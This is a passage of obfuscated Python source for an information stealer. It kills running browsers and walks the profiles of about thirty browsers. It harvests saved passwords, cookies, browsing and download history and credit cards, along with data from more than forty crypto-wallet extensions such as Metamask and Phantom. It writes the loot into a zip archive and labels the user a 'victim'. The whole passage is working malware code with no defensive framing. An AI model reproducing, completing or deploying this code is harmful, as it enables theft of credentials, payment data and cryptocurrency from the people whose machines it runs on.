                                    arcname = os.path.relpath(file_path, XKSKJTYRCXPUWJSJSFCXLSONSVCCHCZWWGCVADVPVEODGPWNJUFGJAYBBGUUHXCDQNHNMQDCWFQXNXBZPVGTBDRTGGIAVLTYA)
                                    FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.write(file_path, os.path.join(ZVKDFEVYGTHRACJNJKYAXLBAAISXZXPLVMXUYHUNDPXCIPVVXXZDRIOSN, arcname))
                        else:
                            FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.write(MDVOACHMVHEAIYHBLXZEONJEHVJDVGAYVIRUOYMZEEQMNNFDCJ, os.path.join(ZVKDFEVYGTHRACJNJKYAXLBAAISXZXPLVMXUYHUNDPXCIPVVXXZDRIOSN, v4r_item))
                    break

            if not UZODNEQAKOHLAIPQENNZUKMCFHTSQDXVTTAWYFZVANWUFVIKYEAODWHWLWIJAWFULDWDMTYIEQVNEKXYKHDHDU:
                BEYZNSTXRMJQPPZUZZZYONXPKAGCRKRODMZLIYALDIPIBKBTVESJKOQOJEPYA = os.path.join(PCEPAUDUQOQRLEJIAWFUVIQRNRFWAALYYYTYXPQVSEVSMDFOROARLBPKORAQYLTSFXY, "Unknown Extension", v4r_extention)
                
                XKSKJTYRCXPUWJSJSFCXLSONSVCCHCZWWGCVADVPVEODGPWNJUFGJAYBBGUUHXCDQNHNMQDCWFQXNXBZPVGTBDRTGGIAVLTYA = os.path.join(TGTQKNDJFRPJRJZJHSQQKTUVMOUJDLGEUDFHNIQZJNCMGLRFWGXQIECCXECXZZQDOEIQIZNIDQORAYZLCCOGTKVVE, v4r_extention)
                for v4r_item in os.listdir(XKSKJTYRCXPUWJSJSFCXLSONSVCCHCZWWGCVADVPVEODGPWNJUFGJAYBBGUUHXCDQNHNMQDCWFQXNXBZPVGTBDRTGGIAVLTYA):
                    MDVOACHMVHEAIYHBLXZEONJEHVJDVGAYVIRUOYMZEEQMNNFDCJ = os.path.join(XKSKJTYRCXPUWJSJSFCXLSONSVCCHCZWWGCVADVPVEODGPWNJUFGJAYBBGUUHXCDQNHNMQDCWFQXNXBZPVGTBDRTGGIAVLTYA, v4r_item)
                    
                    if os.path.isdir(MDVOACHMVHEAIYHBLXZEONJEHVJDVGAYVIRUOYMZEEQMNNFDCJ):
                        for dirpath, dirnames, filenames in os.walk(MDVOACHMVHEAIYHBLXZEONJEHVJDVGAYVIRUOYMZEEQMNNFDCJ):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, XKSKJTYRCXPUWJSJSFCXLSONSVCCHCZWWGCVADVPVEODGPWNJUFGJAYBBGUUHXCDQNHNMQDCWFQXNXBZPVGTBDRTGGIAVLTYA)
                                FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.write(file_path, os.path.join(BEYZNSTXRMJQPPZUZZZYONXPKAGCRKRODMZLIYALDIPIBKBTVESJKOQOJEPYA, arcname))
                    else:
                        FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.write(MDVOACHMVHEAIYHBLXZEONJEHVJDVGAYVIRUOYMZEEQMNNFDCJ, os.path.join(BEYZNSTXRMJQPPZUZZZYONXPKAGCRKRODMZLIYALDIPIBKBTVESJKOQOJEPYA, v4r_item))

    BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_files = [
        ("Google Chrome",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(AFDGNVEZEWLZNNNPXUMVWZAXDURXGBOPYGULVEXPWGQSIGNQZSQUEZODIQSW,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(QZJGRLCPSSTPMQYKMUKBDFPCYLUDEBLVXIOTDJTSXFIBTZEIFOISTAGAWSAADVLWIWT, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    TUCBTFQLDCAGJEXXDTJZGVCNFMDXQLAWLHJIEZQCMZENGZEPNPESXMYQLJWNJPMVNEYKGXZPEPXXLSMTLSQWZVLKBAKQZXMJL = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    DZYDUDOQHOTRDKADGXNSJJPMPMQPILAJGCHLFJKPSBRGJISYMSTSGVGSGHHZEIFSPKRHUXFA = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_proc_name in BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_proc_name in BOJLIBNZQXIEPBGXIEJWRDZWWVGDSRVXZAYBWCFWQVDYXLLJJPOWGRRUROSUIHLEVSVMXDURAJSGCWGJI_files:
        if not os.path.exists(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG):
            continue

        JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX = WHUYWXCTAIGIZTHPEZQPDWVVOAQALWRVRVHJMFPUGGXJDLEANZUXRQPQFMZZOGYUDOFZNVHAPQVYHEPSHJM(os.path.join(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, 'Local State'))
        if not JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX:
            continue

        for v4r_profile in TUCBTFQLDCAGJEXXDTJZGVCNFMDXQLAWLHJIEZQCMZENGZEPNPESXMYQLJWNJPMVNEYKGXZPEPXXLSMTLSQWZVLKBAKQZXMJL:
            ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD = os.path.join(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_profile)
            if not os.path.exists(ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD):
                continue

        for v4r_profile in TUCBTFQLDCAGJEXXDTJZGVCNFMDXQLAWLHJIEZQCMZENGZEPNPESXMYQLJWNJPMVNEYKGXZPEPXXLSMTLSQWZVLKBAKQZXMJL:
            ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD = os.path.join(ZOPHLKAPPQRVFVIVUNUPDBZSMSYINIWKQTUXUQOJTNGKPJUAQPNZUWUZHHQFKEUATPTUNHNWJGQFYMJFYTNZITRLGVKVLG, v4r_profile)
            if not os.path.exists(ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD):
                continue
            
            if "extentions" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
                try: EYZMBGNGWLNNBEHAZDMCAYWLRDYZJEAJQVDUBTUTLJWAUIUVMQYRPFPQXPFKNOCAPFSZXJYUMMYHXO(FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA, DZYDUDOQHOTRDKADGXNSJJPMPMQPILAJGCHLFJKPSBRGJISYMSTSGVGSGHHZEIFSPKRHUXFA, HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD)
                except: pass
                
            if "passwords" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
                try: NVDNHKVQBLXSORWBJYDBBFEYTRVROCDJXPBOULOYRULWSURXEIRTQGHLOUTOGMNLVXB(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX)
                except: pass
            if "cookies" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
                try: VDBRGGACHPPBLLEMRMYLETDJNYKMHMEDONPSZZKWEPDLSAVQRXZMXWOXVLFUFKTRGKZNQZFUFJEVWNVNBNKUYO(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX)
                except: pass
            if "history" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
                try: LPWEYQZESJXKZDHSONHRARTNBYXJBPNZCUVTRBLRPMNBXGHUVIEHNYMFHKTUQDHKFWPRFERVNTYSBJWQBEZDPZ(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD)
                except: pass
            if "downloads" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
                try: XYTHJYMGJCNNJCKSCFSNZWDKTBLGDRZYYAFEYREVNXBGJOSIKBTIBWWMWDGKXSAGHOIFVPJQCDMIZIIFLUNGUGYTWZYFL(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD)
                except: pass
            if "cards" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
                try: ZFJSVIDXIDSZFJTYWCWLQMLMVJWPCXAGNYHYWVDFLFIFMNBXAGHFD(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW, ODYMPQYQANJBKJJSDAJQTMVZYILQUOUMPYIFLZJXUEIPTZVBJFWWZNXVUZMIMZPXULSNVFSRKYKERUSIZUQPAVQRXD, JNJCPELVFICWQKJJSVPNELCZRXTXZWMZUKUXFABAPSEURUEQXDOASZPZUBGWTEGTDIIIIX)
                except: pass

            if HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW not in HKOQSMHAPCRIQEODMNVFVTMHKEMNSLVYFFSPUFYNIEGMCQYHXMRBNCNWZDBTGKHAONMQPIDJEVZRBVKPXYRQISHSICVOPEZN:
                HKOQSMHAPCRIQEODMNVFVTMHKEMNSLVYFFSPUFYNIEGMCQYHXMRBNCNWZDBTGKHAONMQPIDJEVZRBVKPXYRQISHSICVOPEZN.append(HNIDWHPYTSGEPQXYXJJNVPYTBECAGMLTLGGYQPLIIFYGKTULYNEJMZDJBFW)

    if "passwords" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        if not YLMWRTKLHFXMXLEFRBQKKZVNCRIWULROAIJNRRBWPBXWMCARRJNAZRLWVWLRZWBGPDREELINRQKV:
            YLMWRTKLHFXMXLEFRBQKKZVNCRIWULROAIJNRRBWPBXWMCARRJNAZRLWVWLRZWBGPDREELINRQKV.append("No passwords was saved on the victim's computer.")
        YLMWRTKLHFXMXLEFRBQKKZVNCRIWULROAIJNRRBWPBXWMCARRJNAZRLWVWLRZWBGPDREELINRQKV = "\n".join(YLMWRTKLHFXMXLEFRBQKKZVNCRIWULROAIJNRRBWPBXWMCARRJNAZRLWVWLRZWBGPDREELINRQKV)
    if "cookies" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        if not ZRBVASBAPFRBRIQVLKIUHGGRBYOSKTVLSZBJSVIGCWWZDPRUBSEXWYHNZN:
            ZRBVASBAPFRBRIQVLKIUHGGRBYOSKTVLSZBJSVIGCWWZDPRUBSEXWYHNZN.append("No cookies was saved on the victim's computer.")
        ZRBVASBAPFRBRIQVLKIUHGGRBYOSKTVLSZBJSVIGCWWZDPRUBSEXWYHNZN   = "\n".join(ZRBVASBAPFRBRIQVLKIUHGGRBYOSKTVLSZBJSVIGCWWZDPRUBSEXWYHNZN)
    if "history" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        if not BJECRPKRESEDLDRLYYCWYFAHLEBMTJSSMWITXKGYMBHGSIMAILHXQBNENJEYRFEKADZUUTYYIIQ:
            BJECRPKRESEDLDRLYYCWYFAHLEBMTJSSMWITXKGYMBHGSIMAILHXQBNENJEYRFEKADZUUTYYIIQ.append("No history was saved on the victim's computer.")
        BJECRPKRESEDLDRLYYCWYFAHLEBMTJSSMWITXKGYMBHGSIMAILHXQBNENJEYRFEKADZUUTYYIIQ   = "\n".join(BJECRPKRESEDLDRLYYCWYFAHLEBMTJSSMWITXKGYMBHGSIMAILHXQBNENJEYRFEKADZUUTYYIIQ)
    if "downloads" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        if not KOSFLBRLPMNJUXJSKZABFSSIOLXAAMRGSPTFIWLYWNUUVRDBLFINEBWMRDMXKDDSYQUGCPQQQLBVVQUWX:
            KOSFLBRLPMNJUXJSKZABFSSIOLXAAMRGSPTFIWLYWNUUVRDBLFINEBWMRDMXKDDSYQUGCPQQQLBVVQUWX.append("No downloads was saved on the victim's computer.")
        KOSFLBRLPMNJUXJSKZABFSSIOLXAAMRGSPTFIWLYWNUUVRDBLFINEBWMRDMXKDDSYQUGCPQQQLBVVQUWX = "\n".join(KOSFLBRLPMNJUXJSKZABFSSIOLXAAMRGSPTFIWLYWNUUVRDBLFINEBWMRDMXKDDSYQUGCPQQQLBVVQUWX)
    if "cards" in WQTFMVBCHAKJZTKYBCTKNYRNVNKQLDEQKQVIFMFNAMWJZUCQBHQJDCOAXBJNATGFLRNQMKFDOAN:
        if not RWAIWNKWBLBCFKLFPQEJRMJIOXFUXYCEBRYOBOUUKAVXZAWHZCUHXTWSKZDKFDOMURVVIAPLYFBGKDQJZQT:
            RWAIWNKWBLBCFKLFPQEJRMJIOXFUXYCEBRYOBOUUKAVXZAWHZCUHXTWSKZDKFDOMURVVIAPLYFBGKDQJZQT.append("No cards was saved on the victim's computer.")
        RWAIWNKWBLBCFKLFPQEJRMJIOXFUXYCEBRYOBOUUKAVXZAWHZCUHXTWSKZDKFDOMURVVIAPLYFBGKDQJZQT     = "\n".join(RWAIWNKWBLBCFKLFPQEJRMJIOXFUXYCEBRYOBOUUKAVXZAWHZCUHXTWSKZDKFDOMURVVIAPLYFBGKDQJZQT)
    
    if JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH != None:
        FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(f"Passwords ({JPGFNYCGFULRIDZYBAKSLMAVEJURTOONDJREPRTWHKIEUHCZLYRXRXTRSDZIZH}).txt", YLMWRTKLHFXMXLEFRBQKKZVNCRIWULROAIJNRRBWPBXWMCARRJNAZRLWVWLRZWBGPDREELINRQKV)

    if TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU != None:
        FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(f"Cookies ({TNADCGWCZXCPQKISAXFVLYUECIAODZAUHCYDHRTTEFPHPQLHJYIENPOQGCU}).txt", ZRBVASBAPFRBRIQVLKIUHGGRBYOSKTVLSZBJSVIGCWWZDPRUBSEXWYHNZN)

    if PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT != None:
        FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(f"Cards ({PLZFBQFXCGBCUTOKMUKQTOOCZDRAXCZJCFYRAULGTYYITWFAUEJMHVJPRCHIEWDAJYSWYBIJRCCCOAXQAPFHT}).txt", RWAIWNKWBLBCFKLFPQEJRMJIOXFUXYCEBRYOBOUUKAVXZAWHZCUHXTWSKZDKFDOMURVVIAPLYFBGKDQJZQT)

    if VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ != None:
        FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(f"Browsing History ({VGBGBRHDVNYYPHJUOKSGOXSGVNZADFOZAFYESCFZLVTATIRRIGVKKFIYRKMAVGZSZDOIVVFYXJQUHVGGLAZMJ}).txt", BJECRPKRESEDLDRLYYCWYFAHLEBMTJSSMWITXKGYMBHGSIMAILHXQBNENJEYRFEKADZUUTYYIIQ)

    if PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW != None:
        FAQFKQETPMMHNCXMLSXODEEUIKIFIYOPYLVTKFHMSLQKOMQRGWQRXTDQA.writestr(f"Download History ({PBUDQNONXRBVOWVRUQCITJPMPVWOIJYQFCIQYKNPBMAKZKCPFVYPQGFQZGMKGCKJPEXEJXDNQLIHFFIAMESIMGWW}).txt",KOSFLBRLPMNJUXJSKZABFSSIOLXAAMRGSPTFIWLYWNUUVRDBLFINEBWMRDMXKDDSYQUGCPQQQLBVVQUWX)

